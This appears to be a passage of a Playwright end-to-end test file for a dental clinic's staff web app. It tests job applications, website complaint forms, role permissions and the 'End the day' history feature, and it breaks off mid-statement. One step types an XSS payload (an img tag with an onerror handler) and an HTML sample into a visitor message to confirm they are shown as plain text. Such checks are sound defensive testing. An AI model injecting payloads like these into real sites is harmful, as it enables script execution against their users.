  await pf.locator('.topnav .menu:has-text("More") > button').click();
  await pf.locator('.topnav .menu-list a:has-text("Job applications")').click();
  await pf.waitForSelector('table.jobs-table tbody tr');
  const rows = pf.locator('table.jobs-table tbody tr');
  assert.equal(await rows.count(), 3, 'two made-up applications and the one just sent');
  assert.match(await rows.first().innerText(), /Sample Applicant UI[\s\S]*Dental hygienist[\s\S]*0300 5557788[\s\S]*BSc Dental Hygiene[\s\S]*Gulberg Lahore[\s\S]*New/,
    'the degree typed after choosing "Other" (not the word "Other")');
  const [statusSel, jobSel, branchSel] = [0, 1, 2].map((i) => pf.locator('.jobs-filters select').nth(i));
  await statusSel.selectOption('contacted');
  await pf.waitForFunction(() => document.querySelectorAll('table.jobs-table tbody tr').length === 1);
  assert.match(await rows.first().innerText(), /Omar Sample/);
  assert.match(pf.url(), /#\/staff\/jobs\?status=contacted$/, 'the filter is kept in the address');
  await statusSel.selectOption('');
  await jobSel.selectOption('dental_hygienist');
  await pf.waitForFunction(() => document.querySelectorAll('table.jobs-table tbody tr').length === 1);
  assert.match(await rows.first().innerText(), /Sample Applicant UI/);
  await jobSel.selectOption('');
  await branchSel.selectOption('any');
  await pf.waitForFunction(() => document.querySelectorAll('table.jobs-table tbody tr').length === 1);
  assert.match(await rows.first().innerText(), /Omar Sample[\s\S]*Any branch/);
  await branchSel.selectOption('');
  await pf.waitForFunction(() => document.querySelectorAll('table.jobs-table tbody tr').length === 3);
  // The made-up CV that was never sent (four days old) is removed by itself (Today or this page, whichever came first): no button to press.
  await pf.waitForFunction(async () => { const { state } = await import('/js/state.js'); return (await state.data.jobCvOrphans()).length === 0; });
  assert.equal(await pf.getByRole('button', { name: 'Remove them' }).count(), 0);
  await shot(pf, '45-staff-jobs');
});
await step('staff: the application dialog shows the CNIC and phone, the message as text, opens the CV through a short link, and saves status and a note with who and when', async () => {
  await pf.getByRole('button', { name: 'Open the application of Sample Applicant UI' }).click();
  const m = pf.locator('.modal');
  await m.waitFor();
  const text = await m.innerText();
  assert.match(text, /12345-0007788-1/);
  assert.match(text, /0300 5557788/);
  assert.match(text, /<b>Hello<\/b> I can start next month\./, 'the message is shown as typed');
  assert.equal(await m.locator('.job-details b').count(), 0, 'nothing the applicant typed becomes HTML');
  assert.equal(await m.getByRole('link', { name: 'sample.ui+jobs@example.com' }).getAttribute('href'), 'mailto:sample.ui%2Bjobs@example.com',
    'the email link: the address encoded, nothing added');
  const [popup] = await Promise.all([pf.waitForEvent('popup'), m.getByRole('button', { name: /^Open CV \(PDF/ }).click()]);
  await popup.waitForURL(/^blob:/);
  await popup.close();
  await m.getByLabel('Status', { exact: true }).selectOption('interview');
  await m.getByLabel(/^Internal note/).fill('Interview on Saturday (sample).');
  await m.getByRole('button', { name: 'Save' }).click();
  await pf.waitForSelector('.toast:has-text("Saved.")');
  await m.waitFor({ state: 'detached' });
  assert.match(await pf.locator('table.jobs-table tbody tr').first().innerText(), /Interview/);
  await pf.getByRole('button', { name: 'Open the application of Sample Applicant UI' }).click();
  await m.waitFor();
  const history = await m.locator('.job-history').innerText();
  assert.match(history, /Dr\. Ali Rashid[\s\S]*Status changed to Interview/);
  assert.match(history, /Dr\. Ali Rashid[\s\S]*Interview on Saturday \(sample\)\./);
  await shot(pf, '46-staff-job-dialog');
  await pf.keyboard.press('Escape');
  await m.waitFor({ state: 'detached' });
});
await step('staff on a phone: an application opens on its top (job, qualification, mobile), not scrolled down to the Status list', async () => {
  await pf.setViewportSize({ width: 390, height: 664 }); // what a 390x844 phone shows inside the browser
  try {
    for (const name of ['Sana Example', 'Sample Applicant UI']) {
      await pf.getByRole('button', { name: `Open the application of ${name}` }).click();
      const m = pf.locator('.modal');
      await m.waitFor();
      const seen = await m.evaluate((el) => {
        const body = el.querySelector('.modal-body');
        const job = [...el.querySelectorAll('.job-details dt')].find((dt) => dt.textContent === 'Job');
        const b = body.getBoundingClientRect(), j = job.getBoundingClientRect();
        return { scrolls: body.scrollHeight > body.clientHeight, scrollTop: body.scrollTop, jobInView: j.top >= b.top && j.bottom <= b.bottom,
          onTitle: document.activeElement === el.querySelector('h2') };
      });
      assert.deepEqual(seen, { scrolls: true, scrollTop: 0, jobInView: true, onTitle: true }, name);
      if (name === 'Sana Example') await shot(pf, '46b-staff-job-dialog-390x664');
      await pf.keyboard.press('Escape');
      await m.waitFor({ state: 'detached' });
    }
  } finally {
    await pf.setViewportSize({ width: 1366, height: 860 });
  }
});
await step('staff: website forms are in the Complaints inbox marked "Website form" with type, topic, branch and contact details, shown as text, with internal notes only', async () => {
  await pf.goto(BASE + '#/staff/complaints');
  await pf.waitForSelector('table.complaints-table');
  const row = pf.locator('table.complaints-table tbody tr', { hasText: 'Complaint: Waiting time' });
  assert.match(await row.innerText(), /Website form[\s\S]*Sample Visitor UI[\s\S]*0301 5557788[\s\S]*Wants to be contacted[\s\S]*North Nazimabad/);
  assert.match(await pf.locator('table.complaints-table tbody tr', { hasText: 'Suggestion: Clinic cleanliness' }).filter({ hasText: 'sample UI' }).innerText(),
    /Anonymous[\s\S]*Not about one branch/);
  assert.equal(await pf.locator('table.complaints-table tbody tr', { hasText: 'Honeypot sample message' }).count(), 0, 'the honeypot form was not stored');
  await pf.locator('.complaints-from select').selectOption('website');
  const shown = pf.locator('table.complaints-table tbody tr');
  // the list is asked again for the website forms only (the database filters it)
  await pf.waitForFunction(() => document.querySelectorAll('table.complaints-table tbody tr').length === 4);
  assert.equal(await shown.count(), 4, 'two made-up website forms and the two just sent');
  assert.match(pf.url(), /#\/staff\/complaints\?from=website$/, 'the choice is kept in the address');
  assert.equal(await shown.filter({ hasText: 'Website form' }).count(), 4);
  await row.getByRole('button', { name: 'Complaint: Waiting time' }).click();
  const m = pf.locator('.modal');
  await m.waitFor();
  const text = await m.innerText();
  assert.match(text, /Website form Complaint · Waiting time/);
  assert.match(text, /Mr# given: 9812/);
  assert.match(text, /Waited two hours <img src=x onerror="window.__xss=1"> please add more chairs\./, 'the message is shown as typed');
  assert.equal(await m.locator('img').count(), 0, 'no image element from the visitor\'s text');
  assert.equal(await pf.evaluate(() => window.__xss), undefined, 'nothing the visitor typed ran');
  assert.equal(await m.getByText('Internal note (patient does not see it)').count(), 0, 'no reply to a website form: notes only');
  await m.getByLabel(/^Internal note/).fill('Called back, sorry about the wait (sample).');
  await m.getByRole('button', { name: 'Save note' }).click();
  await pf.waitForSelector('.toast:has-text("Saved.")');
  await shot(pf, '47-staff-complaints-website');
});
await step('staff: Dr. Ali deletes a junk website form after a warning; a patient\'s complaint has no Delete', async () => {
  await pf.evaluate(async () => {
    const { state } = await import('/js/state.js');
    await state.data.submitFeedback({ kind: 'complaint', topic: 'other', branch: 'none', message: 'Junk sample text for the delete step.', contact_me: false, pf_trap: '' });
  });
  await pf.goto(BASE + '#/staff/today');
  await pf.goto(BASE + '#/staff/complaints?from=website');
  const junk = pf.locator('table.complaints-table tbody tr', { hasText: 'Junk sample text' });
  await junk.waitFor();
  await junk.getByRole('button', { name: 'Complaint: Other' }).click();
  const dlg = pf.locator('.modal', { hasText: 'Junk sample text' });
  await dlg.waitFor();
  await dlg.getByRole('button', { name: 'Delete', exact: true }).click();
  const confirm = pf.locator('.modal', { hasText: 'Delete this website form?' });
  await confirm.waitFor();
  assert.match(await confirm.innerText(), /removed for good, with its notes\. Use this only for junk or spam/);
  await shot(pf, '47b-staff-complaint-delete');
  await confirm.getByRole('button', { name: 'Delete', exact: true }).click();
  await pf.waitForSelector('.toast:has-text("Deleted.")');
  await junk.waitFor({ state: 'detached' });
  assert.equal(await pf.locator('.modal').count(), 0, 'both dialogs are closed');
  assert.equal(await pf.locator('table.complaints-table tbody tr').count(), 4, 'the other website forms stay');
  await pf.locator('.complaints-from select').selectOption('portal');
  await pf.waitForFunction(() => { const rows = [...document.querySelectorAll('table.complaints-table tbody tr')]; return rows.length > 0 && rows.every((r) => !r.textContent.includes('Website form')); });
  await pf.locator('table.complaints-table tbody tr').first().locator('button.link-btn').click();
  const portal = pf.locator('.modal');
  await portal.waitFor();
  assert.equal(await portal.getByRole('button', { name: 'Delete', exact: true }).count(), 0, "a patient's complaint is never deleted");
  await pf.keyboard.press('Escape');
  await portal.waitFor({ state: 'detached' });
});
// A thank-you or a suggestion is not a complaint about a doctor's work: its dialog has no "About which doctor?", and even when linked
// (as the inbox allowed before) it does not count on that doctor's daily log. Today counts everything new under the inbox's full name.
await step('staff: a website thank-you about a doctor has no "About which doctor?" and never counts as a complaint about that doctor', async () => {
  const docId = await pf.evaluate(async () => {
    const { state } = await import('/js/state.js');
    await state.data.submitFeedback({ kind: 'appreciation', topic: 'doctor', branch: '1', message: 'Thank you Dr. Bushra for the very gentle treatment (sample UI).', contact_me: false, pf_trap: '' });
    return state.ref.clinicians.find((c) => c.display_name === 'Dr. Bushra (sample)').id;
  });
  await pf.goto(BASE + '#/staff/today');
  await pf.locator('a.stat', { hasText: 'New complaints & suggestions' }).waitFor();
  assert.equal(await pf.locator('table.list th', { hasText: 'New complaints & suggestions' }).count(), 1, 'the branch table says the same');
  await pf.goto(BASE + '#/staff/complaints?from=website');
  const thanks = pf.locator('table.complaints-table tbody tr', { hasText: 'very gentle treatment' });
  await thanks.waitFor();
  await thanks.getByRole('button', { name: 'Appreciation: Doctor' }).click();
  const dlg = pf.locator('.modal', { hasText: 'very gentle treatment' });
  await dlg.waitFor();
  assert.equal(await dlg.locator('select[aria-label="About which doctor"]').count(), 0, 'a thank-you is not linked to a doctor as a complaint');
  await shot(pf, '47c-staff-thanks-no-doctor');
  await pf.keyboard.press('Escape');
  await dlg.waitFor({ state: 'detached' });
  await pf.locator('table.complaints-table tbody tr', { hasText: 'Complaint: Waiting time' }).getByRole('button', { name: 'Complaint: Waiting time' }).click();
  const complaint = pf.locator('.modal', { hasText: 'Complaint · Waiting time' });
  await complaint.waitFor();
  assert.equal(await complaint.locator('select[aria-label="About which doctor"]').count(), 1, 'a website complaint still is');
  await pf.keyboard.press('Escape');
  await complaint.waitFor({ state: 'detached' });
  const counts = await pf.evaluate(async (doc) => {
    const { state } = await import('/js/state.js');
    const count = async () => (await state.data.doctorSummary(doc, '2000-01-01', '2100-12-31')).complaints.length;
    const before = await count();
    const thanksRow = (await state.data.complaints({ from: 'website' })).find((c) => c.body.includes('very gentle treatment'));
    await state.data.linkComplaintDoctor(thanksRow.id, doc);
    return [before, await count()];
  }, docId);
  assert.equal(counts[1], counts[0], 'linked anyway, the thank-you adds nothing to the doctor\'s complaints');
  await pf.goto(BASE + `#/staff/log?doctor=${docId}`);
  await pf.locator('.stat', { hasText: 'Complaints about your work' }).waitFor();
  assert.ok(!(await pf.locator('main').innerText()).includes('Appreciation'), 'the doctor\'s log does not list the thank-you');
});
await step('a role without "Job applications" (the clinic coordinator): no menu entry, "Page not available", and the data layer refuses; website forms still reach their inbox', async () => {
  await tryAnotherRole(pf);
  await loginAs(pf, 'Clinic coordinator');
  await pf.locator('a.stat', { hasText: 'New complaints & suggestions' }).waitFor();
  assert.equal(await pf.locator('a.stat', { hasText: 'New job applications' }).count(), 0, 'Today: no number of job applications');
  await pf.locator('.topnav .menu:has-text("More") > button').click();
  const nav = (await pf.locator('.topnav .menu-list a').allTextContents()).map((t) => t.trim());
  assert.ok(nav.includes('Complaints') && !nav.includes('Job applications'), 'Complaints yes, Job applications no');
  await pf.keyboard.press('Escape');
  await pf.goto(BASE + '#/staff/jobs');
  await pf.waitForSelector('h1:has-text("Page not available")');
  const answer = await pf.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const out = [];
    for (const call of [() => state.data.jobApplications(), () => state.data.jobCvOrphans(), () => state.data.jobCvUrl('incoming/00000000-0000-4000-8000-000000000001.pdf')]) {
      try { await call(); out.push('allowed'); } catch (e) { out.push(/row-level security/.test(e.message) ? 'refused' : e.message); }
    }
    return out;
  });
  assert.deepEqual(answer, ['refused', 'refused', 'refused']);
  await pf.goto(BASE + '#/staff/complaints');
  await pf.waitForSelector('table.complaints-table');
  assert.ok(await pf.locator('table.complaints-table .badge:has-text("Website form")').count() >= 4, 'the coordinator handles the website forms');
  await pf.locator('table.complaints-table tbody tr', { hasText: 'Website form' }).first().locator('button.link-btn').click();
  const m = pf.locator('.modal');
  await m.waitFor();
  assert.equal(await m.getByRole('button', { name: 'Save note' }).count(), 1);
  assert.equal(await m.getByRole('button', { name: 'Delete', exact: true }).count(), 0, '... but only an admin deletes one');
  await pf.keyboard.press('Escape');
  await m.waitFor({ state: 'detached' });
});
await step('access list: a "Job applications (CNIC, phone and CV)" row, ticked for nobody but admin by default', async () => {
  await tryAnotherRole(pf);
  await loginAs(pf, 'Dr. Ali Rashid');
  await pf.goto(BASE + '#/staff/admin?tab=access');
  await pf.waitForSelector('table.perm-grid');
  for (const role of ['Front desk', 'Assistant', 'Doctor', 'Clinic coordinator', 'Accountant']) {
    assert.equal(await pf.getByLabel(`${role}: Job applications (CNIC, phone and CV)`).isChecked(), false, role);
  }
});
// The owner (12 Oct 2026): "there's no way to go back to the homepage from here". The account menu and the phone drawer have
// "View the website"; the homepage stays the public one while signed in, with a line back to the staff pages (and the Employee door).
await step('staff: "View the website" in the account menu opens the public homepage; "Back to staff pages" and the Employee door lead back', async () => {
  await pf.goto(BASE + '#/staff/today');
  await pf.waitForSelector('.topbar');
  await pf.locator('.user-menu > button').click();
  const link = pf.locator('#user-menu-list a', { hasText: 'View the website' });
  assert.equal(await link.getAttribute('href'), '#/');
  await link.click();
  await pf.waitForSelector('.door:has-text("Employee")');
  assert.equal(new URL(pf.url()).hash, '#/');
  assert.equal(await pf.locator('.topbar').count(), 0, 'the public homepage, not a staff page');
  for (const t of ['Patient', 'Visitor', 'Our results', 'Employee']) assert.equal(await pf.locator('.door', { hasText: t }).count(), 1, `door ${t}`);
  assert.deepEqual(await barLinks(pf), BAR, 'with the two forms in the top bar');
  assert.equal(await pf.locator('#work-with-us a.forms-card').count(), 2, '... and the section on them further down');
  const back = pf.locator('.staff-return');
  await back.waitFor();
  assert.match(await back.innerText(), /You are signed in to the clinic system\. Back to staff pages/);
  await shot(pf, '48-home-signed-in');
  await back.getByRole('link', { name: 'Back to staff pages' }).click();
  await pf.waitForSelector('.topbar');
  assert.match(pf.url(), /#\/staff\/today$/);
  await pf.evaluate(() => { location.hash = '#/'; });
  await pf.locator('.door:has-text("Employee")').click();
  await pf.waitForSelector('.topbar');
  assert.match(pf.url(), /#\/staff\/today$/, 'the Employee door goes straight to the staff pages while signed in');
});
await step('staff on a phone: "View the website" is at the foot of the drawer; a visitor (nobody signed in) sees no "Back to staff pages"', async () => {
  await pf.setViewportSize({ width: 390, height: 844 });
  await pf.locator('.menu-toggle').click();
  await pf.waitForSelector('#staff-drawer.open');
  const link = pf.locator('#staff-drawer .sidebar-foot a', { hasText: 'View the website' });
  await link.waitFor();
  assert.equal(await link.getAttribute('href'), '#/');
  await pf.waitForTimeout(300); // the drawer slides in
  await shot(pf, '49-drawer-view-website');
  await link.click();
  await pf.waitForSelector('.door:has-text("Employee")');
  assert.equal(await pf.evaluate(() => document.body.classList.contains('drawer-open')), false, 'the drawer is closed');
  await pf.locator('.staff-return').waitFor();
  assert.ok(await docWidth(pf) <= 390, 'no sideways scrolling at 390 px');
  const visitor = await newPage({ width: 390, height: 844 });
  await visitor.goto(BASE);
  await visitor.waitForSelector('.sx-day');
  assert.equal(await visitor.locator('.staff-return:not([hidden])').count(), 0);
  await visitor.close();
  await pf.setViewportSize({ width: 1366, height: 860 });
});

// ------------------------------------------------------------- "End the day" and the History of Aaj ki List (owner, 12 Oct 2026)
// (The demo has one day ended already: North Nazimabad five days ago, at 21:05, by its front desk. Made-up names only.)
const pd = await newPage();
const dayInfo = (pg, n) => pg.evaluate(async (k) => {
  const { addDaysISO, localISO } = await import('/js/ui/dom.js');
  const { dayLabel } = await import('/js/lib/day-list.js');
  const iso = addDaysISO(localISO(), k);
  return { iso, label: dayLabel(iso) };
}, n);
const sheetStatuses = (pg) => pg.locator('table.sheet tbody tr[data-id] select[aria-label^="Status for"]').evaluateAll((els) => els.map((e) => e.value));
const historyLines = async (pg) => (await pg.locator('.day-history-list a').allInnerTexts()).map((t) => t.replace(/\s+/g, ' ').trim());
await step('End the day: the front desk ends today\'s list; the dialog gives the counts, the toast says the copy is saved, and the next day\'s list opens', async () => {
  await loginAs(pd, 'Front desk \\(North Nazimabad\\)');
  await pd.goto(BASE + '#/staff/sheet');
  await pd.waitForSelector('table.sheet tbody tr.is-checkup');
  const today = await dayInfo(pd, 0);
  const tomorrow = await dayInfo(pd, 1);
  // The dialog counts the whole day's list (no filter is on here): every row, the completed ones, those still waiting or in treatment.
  const statuses = await sheetStatuses(pd);
  const checkups = await pd.locator('table.sheet tbody tr.is-checkup').count();
  const done = statuses.filter((s) => s === 'completed').length;
  const busy = statuses.filter((s) => s === 'waiting' || s === 'in_treatment').length;
  assert.ok(busy > 0 && done > 0 && checkups > 0, 'the demo list has finished, waiting and checkup patients');
  await pd.getByRole('button', { name: 'End the day' }).click();
  const m = pd.locator('.modal');
  await m.waitFor();
  assert.equal(await m.locator('h2').innerText(), `End the day for North Nazimabad, ${today.label}?`);
  // The parts add up to the total, and "patients" means what the list's header says: its patients, then its checkups.
  const other = statuses.length - done - busy;
  const parts = [`${done} completed`, `${busy} still waiting or in treatment`,
    other ? `${other} other (${statuses.includes('') ? 'scheduled, cancelled, no show or no status yet' : 'scheduled, cancelled or no show'})` : null].filter(Boolean);
  assert.equal(await m.locator('p').first().innerText(),
    `${statuses.length} patients (incl. ${checkups} checkup patients): ${parts.join(', ')}. A copy of the list is saved in History.`);
  // (the sheet view's counts above the list: "All" is every row, its patients and checkups; "Checkups" the checkup patients)
  const countOf = async (key) => Number(await pd.locator(`.sheet-counts button[data-key="${key}"] strong`).innerText());
  assert.deepEqual([await countOf(''), await countOf('checkups')], [statuses.length, checkups], 'the counts above the list and the dialog agree');
  assert.match(await m.innerText(), new RegExp(`The ${busy} patients still waiting or in treatment stay as they are`));
  assert.match(await m.innerText(), new RegExp(`After that the list for ${tomorrow.label} opens`));
  // It starts on Cancel (a second Enter or a held key does not end the day), and the counts are the dialog's description.
  assert.equal(await pd.evaluate(() => document.activeElement?.textContent), 'Cancel', 'the dialog starts on Cancel');
  assert.equal(await m.evaluate((el) => document.getElementById(el.getAttribute('aria-describedby'))?.classList.contains('modal-body')), true,
    'the counts are read out with the title');
  await shot(pd, '20-end-the-day-dialog');
  await m.getByRole('button', { name: 'End the day' }).click();
  await pd.waitForSelector('.toast:has-text("Day ended. Copy saved in History.")');
  await pd.waitForFunction((d) => location.hash.includes(`date=${d}`), tomorrow.iso);
  assert.equal(await pd.locator('input[aria-label="Date"]').inputValue(), tomorrow.iso, 'the next day\'s list is open (the "reset")');
  assert.equal((await pd.locator('.day-end-note').innerText()).trim(),
    `${today.label} was ended and its list saved in History. This is the list for ${tomorrow.label}. See the saved copy · Back to ${today.label}`);
  assert.equal(await pd.getByRole('button', { name: 'End the day' }).count(), 0, 'a day still to come cannot be ended');
  // A patient who arrives after the day was ended: the add panel and the toast say that this list books them for tomorrow.
  assert.equal(await pd.locator('.add-panel-text .muted').innerText(),
    `This is the list for ${tomorrow.label}: patients added here are booked for that day. For a patient who is here now, press Today.`);
  // (Saad Malik has no braces case, so no braces month dialog opens for him)
  await pd.fill('.add-panel input[type=search]', 'Saad');
  await pd.click('.suggestions button:has-text("Saad Malik")');
  await pd.waitForSelector(`.toast:has-text("Saad Malik booked for ${tomorrow.label}.")`);
  await shot(pd, '21-next-day-after-end');
  // "Back to" the ended day; nothing on its list was changed.
  await pd.locator('.day-end-note a', { hasText: `Back to ${today.label}` }).click();
  await pd.waitForFunction((d) => document.querySelector('input[aria-label="Date"]')?.value === d, today.iso);
  await pd.waitForSelector('table.sheet tbody tr.is-checkup');
  assert.deepEqual(await sheetStatuses(pd), statuses, 'every row is as it was');
  assert.match(await pd.locator('.add-panel-text .muted').innerText(), /^New and starting treatment\?/, 'today\'s add panel is the usual one');
});
await step('End the day: an ended day says when and by whom (with a link to its copy), the rows stay editable, and ending it again updates the copy', async () => {
  const note = pd.locator('.day-end-note');
  await note.locator('text=This day was ended').waitFor();
  assert.match((await note.innerText()).trim(), /^This day was ended at \d{2}:\d{2} by Front desk \(North Nazimabad\)\. Ending it again updates the copy\. See the saved copy$/);
  // (on a laptop the note is under the list, above the add line, where it takes its room from the bottom of the list: it
  //  never moves the rows)
  const place = await pd.evaluate(() => {
    const [n, w, a] = ['.day-end-note', '.sheet-wrap', '.add-panel'].map((s) => document.querySelector(s).getBoundingClientRect());
    return { underList: n.top >= w.bottom - 1, aboveAddLine: n.bottom <= a.top + 1 };
  });
  assert.deepEqual(place, { underList: true, aboveAddLine: true }, 'the note is under the list, above the add line');
  assert.equal(await pd.locator('table.sheet tbody tr input[aria-label^="Treatment details"]').first().isDisabled(), false, 'the rows can still be edited');
  // The note is a live region: the reloads of the list (every 20 seconds, on every change) must not write it again, or a
  // screen reader says it each time.
  const reloads = await pd.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const el = document.querySelector('.day-end-note');
    let changes = 0;
    const watch = new MutationObserver((list) => { changes += list.length; });
    watch.observe(el, { childList: true, subtree: true, characterData: true, attributes: true });
    const real = state.data.dayClosing;
    let asked = 0;
    state.data.dayClosing = (...args) => { asked += 1; return real.apply(state.data, args); };
    for (let i = 0; i < 3; i += 1) { document.dispatchEvent(new CustomEvent('sheet-reload')); await new Promise((r) => setTimeout(r, 300)); }
    state.data.dayClosing = real;
    watch.disconnect();
    return { changes, asked };
  });
  assert.ok(reloads.asked >= 3, 'each reload looked the day up again');
  assert.equal(reloads.changes, 0, 'the note was not written again');
  await shot(pd, '22-sheet-ended-day-banner');
  // A checkup patient finishes after the day was ended; the day is ended again.
  const checkup = pd.locator('table.sheet tbody tr.is-checkup', { has: pd.locator('select[aria-label^="Status for"] option:checked[value="waiting"]') }).first();
  await checkup.locator('select[aria-label^="Status for"]').selectOption('completed');
  await pd.waitForTimeout(300);
  await pd.getByRole('button', { name: 'End the day' }).click();
  await pd.locator('.modal p:has-text("This day was already ended at")').waitFor();
  await pd.locator('.modal').getByRole('button', { name: 'End the day' }).click();
  await pd.waitForSelector('.toast:has-text("Day ended. Copy saved in History.")');
  await pd.waitForFunction(() => !document.querySelector('.modal'));
  await pd.getByRole('button', { name: 'Today', exact: true }).click();
  await note.locator('a:has-text("See the saved copy")').click();
  await pd.waitForSelector('.day-copy table.sheet tbody tr');
  assert.match((await pd.locator('.alert-info').innerText()).trim(),
    /^Saved copy from \d{2}:\d{2}, when Front desk \(North Nazimabad\) ended the day\. The day was ended 2 times; this is the latest copy\.$/);
  assert.equal(await pd.locator('.day-copy tbody tr.is-checkup select, .day-copy tbody tr.is-checkup input').count(), 0);
  assert.ok(await pd.locator('.day-copy tbody tr.is-checkup .status-chip:has-text("Completed")').count() >= 2, 'the copy has the change made before it was ended again');
  // A checkup patient from the website has no token: a dash to see, "No token" for a screen reader.
  const noToken = pd.locator('.day-copy tbody tr.is-checkup', { hasText: 'Bareera Khalid' }).locator('.token-cell');
  assert.equal(await noToken.textContent(), '–No token');
  assert.equal(await noToken.locator('[aria-hidden="true"]').textContent(), '–');
  assert.equal(await noToken.locator('.sr-only').textContent(), 'No token');
  assert.equal(await pd.locator('.day-copy tbody tr.is-checkup', { hasText: 'Salma Nadeem' }).locator('.token-cell').textContent(), 'Token 7');
});
await step('History of Aaj ki List: next to the Aaj ki List in the menu; one line per day ("Ended 21:05 by ..." or "Not ended"); the front desk sees its own branch only', async () => {
  const ended = await dayInfo(pd, -5);
  const today = await dayInfo(pd, 0);
  await pd.locator('.topnav .menu:has-text("Aaj ki List") > button').click();
  const items = (await pd.locator('.topnav .menu:has(> button:has-text("Aaj ki List")) .menu-list a').allInnerTexts()).map((t) => t.trim());
  assert.deepEqual(items.slice(0, 2), ['Aaj ki List', 'History of Aaj ki List'], 'right under the Aaj ki List');
  await pd.locator('.topnav .menu-list a:has-text("History of Aaj ki List")').click();
  await pd.waitForSelector('.day-history-list a');
  assert.match(await pd.locator('.topnav .menu:has(> button:has-text("Aaj ki List")) > button').getAttribute('class'), /current/, 'the Aaj ki List menu stays highlighted');
  const lines = await historyLines(pd);
  assert.match(lines[0], new RegExp(`^${today.label} – North Nazimabad – \\d+ patients \\(\\d+ completed\\) Ended \\d{2}:\\d{2} by Front desk \\(North Nazimabad\\)$`), lines[0]);
  assert.ok(lines.includes(`${ended.label} – North Nazimabad – 3 patients (3 completed) Ended 21:05 by Front desk (North Nazimabad)`), 'the day ended five days ago');
  assert.ok(lines.some((t) => / Not ended$/.test(t)), 'days that were not ended say so');
  assert.ok(lines.every((t) => t.includes(' – North Nazimabad – ')), 'a desk limited to North Nazimabad sees only its branch');
  assert.deepEqual(await pd.locator('select[aria-label="Branch"] option').allInnerTexts(), ['North Nazimabad']);
  await shot(pd, '23-history-front-desk');
});
await step('History of Aaj ki List: a saved day opens read only, in the Aaj ki List\'s columns and order; a day that was not ended says it is the list as stored now', async () => {
  const ended = await dayInfo(pd, -5);
  await pd.locator('.day-history-list a', { hasText: `${ended.label} – North Nazimabad` }).click();
  await pd.waitForSelector('.day-copy table.sheet tbody tr');
  assert.equal(await pd.locator('h1').innerText(), `${ended.label} – North Nazimabad`);
  assert.equal((await pd.locator('.alert-info').innerText()).trim(), 'Saved copy from 21:05, when Front desk (North Nazimabad) ended the day.');
  assert.equal(await pd.locator('.day-copy input, .day-copy select, .day-copy textarea, .day-copy button').count(), 0, 'read only');
  assert.deepEqual((await pd.locator('.day-copy thead th').allInnerTexts()).map((t) => t.trim()),
    ['# · Patient', 'Flags', 'Month', 'Treatment', 'Token', 'Status', "Doctor's name", 'Treatment details', 'Dues', 'Notes', 'Contact'], 'the Aaj ki List\'s columns');
  const serials = await pd.locator('.day-copy tbody .serial').evaluateAll((els) => els.map((e) => e.textContent.replace(/\D/g, '')));
  assert.deepEqual(serials, serials.map((_, i) => String(i + 1)), 'numbered 1..n');
  assert.equal(await pd.getByRole('button', { name: 'Download (CSV)' }).count(), 0, 'no download for the front desk (no export rights)');
  assert.equal(await pd.getByRole('link', { name: 'Open this day on the Aaj ki List' }).getAttribute('href'), `#/staff/sheet?branch=2&date=${ended.iso}`);
  await shot(pd, '24-history-saved-day');
  await pd.locator('.back-line a').click();
  await pd.waitForSelector('.day-history-list a');
  await pd.locator('.day-history-list a', { hasText: 'Not ended' }).first().click();
  await pd.waitForSelector('.day-copy');
  assert.equal((await pd.locator('.alert-warning').innerText()).trim(), 'Not ended; this is the list as stored now.');
  // The Aaj ki List of the ended day itself links back to its copy.
  await pd.goto(BASE + `#/staff/sheet?branch=2&date=${ended.iso}`);
  await pd.locator('.day-end-note:has-text("This day was ended at 21:05 by Front desk (North Nazimabad).")').waitFor();
  assert.equal(await pd.locator('.day-end-note a').getAttribute('href'), `#/staff/day-history?branch=2&date=${ended.iso}`);
});
const ph = await newPage();
await step('History of Aaj ki List for Dr. Ali: every branch, newest first; the branch and month filters, paging, and Download (CSV) of a day', async () => {
  await loginAs(ph, 'Dr. Ali Rashid');
  const ended = await dayInfo(ph, -5);
  await ph.goto(BASE + '#/staff/day-history');
  await ph.waitForSelector('.day-history-list a');
  // Every branch: one line per list ("<n> lists"); the pager only when there is more than one page.
  const total = Number((await ph.locator('.page-head p').innerText()).match(/^([\d,]+) lists$/)[1].replace(/,/g, ''));
  assert.equal(await ph.locator('.pager').isVisible(), total > 60, `${total} lists: the pager shows only for more than one page`);
  let lines = await historyLines(ph);
  assert.ok(total >= lines.length && lines.length > 5, `${total} lines`);
  assert.ok(new Set(lines.map((t) => t.split(' – ')[1])).size > 1, 'more than one branch');
  if (total > 60) {
    await ph.getByRole('button', { name: 'Next' }).click();
    await ph.waitForFunction(() => document.querySelector('.pager-info')?.textContent.includes('Showing 61-'));
    await ph.getByRole('button', { name: 'Previous' }).click();
    await ph.waitForFunction(() => document.querySelector('.pager-info')?.textContent.includes('Showing 1-'));
  }
  // Branch, then month.
  await ph.locator('select[aria-label="Branch"]').selectOption({ label: 'Gulshan (RJ Mall)' });
  await ph.waitForFunction(() => [...document.querySelectorAll('.day-history-list a')].every((a) => a.textContent.includes('Gulshan (RJ Mall)')));
  const month = ended.iso.slice(0, 7);
  await ph.locator('input[aria-label="Month"]').fill(month);
  const [, mon, year] = ended.label.match(/ (\w{3}) (\d{4})$/);
  await ph.waitForFunction(([mo, y]) => { const a = [...document.querySelectorAll('.day-history-list a')]; return a.length > 0 && a.every((x) => x.textContent.includes(` ${mo} ${y} – Gulshan (RJ Mall)`)); }, [mon, year]);
  assert.match(await ph.evaluate(() => location.hash), new RegExp(`branch=1&month=${month}`));
  assert.match(await ph.locator('.page-head p').innerText(), /^\d+ days? match(es)? these filters$/, 'one branch: days');
  assert.equal(await ph.locator('.pager').isVisible(), false, 'one month of one branch fits on one page: no pager');
  // ... and a screen reader still hears the new count: it is in a live region that is shown (not inside the hidden pager).
  const live = ph.locator('[role="status"]').filter({ hasText: /match(es)? these filters$/ });
  assert.equal(await live.count(), 1, 'one live region holds the count');
  assert.ok(await live.isVisible(), 'the live region with the count is shown');
  assert.equal(Number((await live.innerText()).match(/^(\d+) /)[1]), (await historyLines(ph)).length, 'the count read out is the number of lines');
  await shot(ph, '25-history-filters');
  // A filter change that gives the same count is read out too (the branches work the same days, so another branch in the
  // same month often has as many). Every write to a live region is noted, with whether that region is shown.
  await ph.evaluate(() => {
    window.liveWrites = [];
    new MutationObserver((list) => {
      for (const m of list) {
        const region = (m.target.nodeType === 1 ? m.target : m.target.parentElement)?.closest('[role="status"], [role="alert"], [aria-live]');
